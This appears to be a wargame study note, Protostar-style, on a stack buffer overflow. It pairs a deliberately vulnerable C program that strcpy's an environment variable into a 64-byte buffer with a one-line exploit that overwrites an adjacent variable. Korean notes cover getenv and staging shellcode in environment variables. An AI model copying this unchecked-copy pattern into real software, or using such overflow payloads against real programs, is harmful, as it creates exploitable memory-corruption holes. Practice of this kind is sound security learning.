# CODE NAME : bof_example02.c

***Source code***
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <err.h>

int main (int argc, char **argv) {

	volatile int modified;
	char buffer[64];
	char *variable;

	variable = getenv("GREENIE");

	if (variable==NULL) {
		errx(1, "please specify an arguments\n");
	}

	modified = 0;
	strcpy(buffer, variable);

	if(modified == 0x61626364) {
		printf("you have correctly got the variable to the right value\n");
	} else {
		printf("Try againg, you got 0x%08x\n" ,modified);
	}
}
```

```
[+]Exploit
1. env GREENIE=$(python -c "print('a'*64 + '\x64\x63\x62\x61')")


[+]Noteit
: 환경변수를 읽어오는 getenv 함수
: 환경변수에 쉘 코드 또는 익스플로잇 코드를 올리는 방법

[+]Refer
: volatile는 해당 변수를 최적화에서 제외하여 항상 메모리에 접근하도록 만듬, 즉 이 변수는
언제든지 값이 바뀔 수 있으니까 항상 메모리에 접근할라고 컴파일러에게 알려주는 것
```